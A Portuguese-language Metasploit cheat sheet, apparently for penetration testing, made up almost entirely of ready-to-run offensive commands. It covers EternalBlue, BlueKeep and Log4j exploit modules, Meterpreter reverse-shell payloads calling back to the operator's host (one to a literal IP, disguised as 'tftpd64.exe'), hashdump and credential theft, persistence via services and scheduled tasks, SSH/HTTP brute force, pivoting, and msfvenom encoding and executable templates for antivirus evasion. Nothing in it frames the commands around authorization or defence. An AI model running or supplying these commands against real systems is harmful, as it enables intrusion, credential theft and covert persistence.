
## 1. Configuração Inicial do Metasploit

### 1.1 Instalação e Configuração
```bash
# Atualizar sistema
sudo apt update

# Instalar Metasploit
sudo apt install metasploit-framework

# Iniciar PostgreSQL
sudo service postgresql start

# Inicializar banco de dados
sudo msfdb init

# Verificar status
sudo msfdb status

# Iniciar Metasploit
sudo msfconsole
```

### 1.2 Comandos Básicos
```bash
# Verificar versão
version

# Verificar banco de dados
db_status

# Verificar hosts
hosts

# Verificar serviços
services

# Verificar vulnerabilidades
vulns

# Verificar credenciais
creds
```

## 2. Importação de Dados

### 2.1 Importar Resultados do Nmap
```bash
# Executar nmap dentro do Metasploit
db_nmap -sV TARGET_IP --open -Pn

# Importar arquivo XML do nmap
db_import /path/to/scan.xml

# Verificar dados importados
hosts
services
```

### 2.2 Importar Lista de Hosts
```bash
# Adicionar hosts manualmente
hosts -a TARGET_IP

# Adicionar serviços manualmente
services -a TARGET_IP 80 tcp http

# Adicionar vulnerabilidades
vulns -a TARGET_IP 80 tcp http "CVE-2021-1234"
```

## 3. Busca de Exploits

### 3.1 Comandos de Busca
```bash
# Buscar por tipo
search type:exploit

# Buscar por plataforma
search platform:windows

# Buscar por serviço
search service:http

# Buscar por CVE
search cve:2021-1234

# Buscar por nome
search name:eternalblue

# Buscar por descrição
search description:"remote code execution"
```

### 3.2 Filtros de Busca
```bash
# Buscar exploits para Windows
search type:exploit platform:windows

# Buscar exploits para Linux
search type:exploit platform:linux

# Buscar exploits para HTTP
search type:exploit service:http

# Buscar exploits para SMB
search type:exploit service:smb

# Buscando por versão
search type:exploit fullname:"Samba 3.0.20"
```

## 4. Uso de Exploits

### 4.1 Estrutura Básica
```bash
# Selecionar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Ver informações
info

# Ver opções
show options

# Configurar opções
set RHOSTS TARGET_IP
set LHOST MY_IP
set LPORT 4444

# Verificar configuração
show options

# Executar exploit
exploit
```

### 4.2 Payloads
```bash
# Ver payloads disponíveis
show payloads

# Selecionar payload
set payload windows/x64/meterpreter/reverse_tcp

# Ver opções do payload
show options

# Configurar payload
set LHOST MY_IP
set LPORT 4444
```

### 4.3 Execução
```bash
# Executar exploit
exploit

# Executar em background
exploit -j

# Ver jobs
jobs

# Parar job
jobs -k JOB_ID
```

## 5. Gerenciamento de Sessões

### 5.1 Visualizar Sessões
```bash
# Listar sessões
sessions

# Listar sessões com detalhes
sessions -l

# Listar sessões ativas
sessions -i
```

### 5.2 Interagir com Sessões
```bash
# Conectar à sessão
sessions -i 1

# Conectar à sessão específica
sessions -i SESSION_ID

# Executar comando em sessão
sessions -c "whoami" 1

# Executar script em sessão
sessions -c "run post/windows/gather/hashdump" 1
```

### 5.3 Background e Foreground
```bash
# Colocar sessão em background
background

# Voltar à sessão
sessions -i SESSION_ID

# Sair da sessão
exit
```

## 6. Meterpreter

### 6.1 Comandos Básicos
```bash
# Informações do sistema
sysinfo

# Informações do usuário
getuid

# Informações da sessão
get_session

# Verificar privilégios
getprivs

# Verificar processos
ps

# Verificar serviços
getservices
```

### 6.2 Navegação
```bash
# Listar diretório atual
pwd

# Mudar diretório
cd /path/to/directory

# Listar arquivos
ls

# Listar arquivos ocultos
ls -la

# Criar diretório
mkdir directory_name

# Remover diretório
rmdir directory_name
```

### 6.3 Transferência de Arquivos
```bash
# Baixar arquivo
download /path/to/file

# Baixar arquivo para local específico
download /path/to/file /local/path

# Upload de arquivo
upload /local/file /remote/path

# Upload de arquivo para local específico
upload /local/file /remote/path
```

### 6.4 Execução de Comandos
```bash
# Executar comando
execute -f cmd.exe -a "/c whoami"

# Executar comando em background
execute -f cmd.exe -a "/c whoami" -H

# Executar comando com output
execute -f cmd.exe -a "/c whoami" -i

# Executar comando com output e background
execute -f cmd.exe -a "/c whoami" -i -H
```

## 7. Post-Exploitation

### 7.1 Coleta de Informações
```bash
# Hashdump
run post/windows/gather/hashdump

# Credenciais
run post/windows/gather/credentials

# Informações do sistema
run post/windows/gather/enum_logged_on_users

# Informações de rede
run post/windows/gather/enum_network

# Informações de processos
run post/windows/gather/enum_processes
```

### 7.2 Escalação de Privilégios
```bash
# Verificar privilégios
getprivs

# Tentar escalação
run post/windows/escalate/getsystem

# Verificar UAC
run post/windows/escalate/droplnk

# Verificar tokens
run post/windows/escalate/token_hunter
```

### 7.3 Persistência
```bash
# Criar serviço
run post/windows/manage/persistence_exe

# Criar startup
run post/windows/manage/persistence_startup

# Criar scheduled task
run post/windows/manage/persistence_scheduled_task
```

## 8. Pivoting

### 8.1 Adicionar Rotas
```bash
# Ver rotas atuais
route

# Adicionar rota
route add 192.168.1.0/24 1

# Adicionar rota específica
route add 192.168.1.100/32 1

# Remover rota
route del 192.168.1.0/24
```

### 8.2 Proxy SOCKS
```bash
# Configurar proxy SOCKS
use auxiliary/server/socks4a
set SRVHOST 0.0.0.0
set SRVPORT 1080
run

# Configurar proxychains
echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf

# Usar com outras ferramentas
proxychains nmap -sT 192.168.1.0/24
```

### 8.3 Port Forwarding
```bash
# Adicionar port forward
portfwd add -l 8080 -p 80 -r 192.168.1.100

# Listar port forwards
portfwd list

# Remover port forward
portfwd delete -l 8080
```

## 9. Auxiliaries

### 9.1 Scanners
```bash
# Port scanner
use auxiliary/scanner/portscan/tcp
set RHOSTS TARGET_IP
run

# HTTP scanner
use auxiliary/scanner/http/http_version
set RHOSTS TARGET_IP
run

# SMB scanner
use auxiliary/scanner/smb/smb_version
set RHOSTS TARGET_IP
run
```

### 9.2 Brute Force
```bash
# SSH brute force
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run

# HTTP brute force
use auxiliary/scanner/http/http_login
set RHOSTS TARGET_IP
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 9.3 Exploits Auxiliares
```bash
# HTTP exploit
use auxiliary/scanner/http/http_method
set RHOSTS TARGET_IP
run

# SMB exploit
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS TARGET_IP
run
```

## 10. MSFVenom

https://www.revshells.com/

### 10.1 Geração de Payloads
```bash
# Payload Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f exe -o payload.exe

# Payload Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f elf -o payload.elf

# Payload PHP
msfvenom -p php/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f raw -o payload.php

# Payload ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f asp -o payload.asp
```

### 10.2 Encoding e Evasão
```bash
# Payload com encoding
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f exe -e x86/shikata_ga_nai -i 3 -o payload.exe

# Payload com encoder específico
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f exe -e x86/alpha_upper -o payload.exe

# evasão usando http
msfvenom -p windows/meterpreter/reverse_http LHOST=172.23.10.64 LPORT=80 -f exe -o tftpd64.exe
```

### 10.3 Payloads Customizados
```bash
# Payload com template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f exe -x /path/to/template.exe -o payload.exe

# Payload com icon
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=MY_IP LPORT=4444 -f exe -i /path/to/icon.ico -o payload.exe
```

## 11. Multi-Handler

### 11.1 Configuração
```bash
# Selecionar multi-handler
use exploit/multi/handler

# Configurar payload
set payload windows/x64/meterpreter/reverse_tcp

# Configurar opções
set LHOST MY_IP
set LPORT 4444

# Executar em background
exploit -j
```

### 11.2 Gerenciamento
```bash
# Ver jobs
jobs

# Parar job
jobs -k JOB_ID

# Parar todos os jobs
jobs -K
```

## 12. Exploits Comuns

### 12.1 EternalBlue (MS17-010)
```bash
# Selecionar exploit
use exploit/windows/smb/ms17_010_eternalblue

# Configurar
set RHOSTS TARGET_IP
set LHOST MY_IP

# Executar
exploit
```

### 12.2 BlueKeep (CVE-2019-0708)
```bash
# Selecionar exploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce

# Configurar
set RHOSTS TARGET_IP
set LHOST MY_IP

# Executar
exploit
```

### 12.3 Log4j (CVE-2021-44228)
```bash
# Selecionar exploit
use exploit/multi/http/log4j_header_injection

# Configurar
set RHOSTS TARGET_IP
set LHOST MY_IP
set LPORT 4444

# Executar
exploit
```

## 13. Troubleshooting

### 13.1 Problemas Comuns
```bash
# Verificar conexão
ping TARGET_IP

# Verificar porta
nc -v TARGET_IP PORT

# Verificar firewall
nmap -p PORT TARGET_IP

# Verificar logs
tail -f /var/log/metasploit.log
```

### 13.2 Debug
```bash
# Modo debug
set VERBOSE true

# Modo trace
set TRACE true

# Modo debug do payload
set DEBUG true
```

## 14. Checklist de Validação

- [ ] Metasploit configurado
- [ ] Banco de dados inicializado
- [ ] Dados importados
- [ ] Exploits pesquisados
- [ ] Payloads configurados
- [ ] Sessões estabelecidas
- [ ] Meterpreter funcionando
- [ ] Post-exploitation executado
- [ ] Pivoting configurado
- [ ] Persistência estabelecida
- [ ] Resultados documentados

## 15. Dicas Importantes

1. **Sempre usar sudo** para inicializar
2. **Verificar banco de dados** antes de começar
3. **Salvar resultados** regularmente
4. **Usar background** para múltiplas sessões
5. **Configurar pivoting** quando necessário
6. **Documentar exploits** utilizados
7. **Verificar logs** para troubleshooting
8. **Priorizar exploits** baseado no objetivo
